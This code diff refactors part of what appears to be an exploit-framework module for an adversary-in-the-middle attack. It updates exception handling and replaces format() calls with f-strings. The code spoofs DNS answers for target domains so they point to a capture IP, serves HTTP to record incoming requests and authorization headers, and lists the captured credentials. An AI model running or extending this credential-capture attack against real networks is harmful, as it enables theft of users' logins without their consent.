@@ -72,7 +72,7 @@ class _DNS(threading.Thread):
         while not self._stop.is_set():
             try:
                 data, addr = s.recvfrom(1024)
-            except socket.timeout:
+            except TimeoutError:
                 continue
             domain = self._parse(data)
             if domain and domain.rstrip(".") in self.TARGETS:
@@ -148,8 +148,7 @@ class Exploit(BaseExploit):
             print_error("capture_ip required"); return
 
         _CredHandler.captured = []
-        print_status("AITM: DNS={}:{}, HTTP={}:{}, redirect={}".format(
-            self.target, self.dns_port, self.target, self.port, self.capture_ip))
+        print_status(f"AITM: DNS={self.target}:{self.dns_port}, HTTP={self.target}:{self.port}, redirect={self.capture_ip}")
 
         dns = _DNS(str(self.target), int(self.dns_port), str(self.capture_ip))
         dns.start()
@@ -157,11 +156,11 @@ class Exploit(BaseExploit):
         try:
             httpd = HTTPServer((str(self.target), int(self.port)), _CredHandler)
         except OSError as e:
-            print_error("HTTP bind failed: {}".format(e)); dns.stop(); return
+            print_error(f"HTTP bind failed: {e}"); dns.stop(); return
 
         t = threading.Thread(target=httpd.serve_forever, daemon=True)
         t.start()
-        print_success("AITM running — {} seconds".format(self.duration))
+        print_success(f"AITM running — {self.duration} seconds")
 
         try:
             time.sleep(int(self.duration))
@@ -169,7 +168,7 @@ class Exploit(BaseExploit):
             pass
 
         httpd.shutdown(); dns.stop()
-        print_status("=== {} request(s) captured ===".format(len(_CredHandler.captured)))
+        print_status(f"=== {len(_CredHandler.captured)} request(s) captured ===")
         for e in _CredHandler.captured:
             print_info("  [{ts}] {ip} {method} {path}".format(**e))
             if "auth" in e:
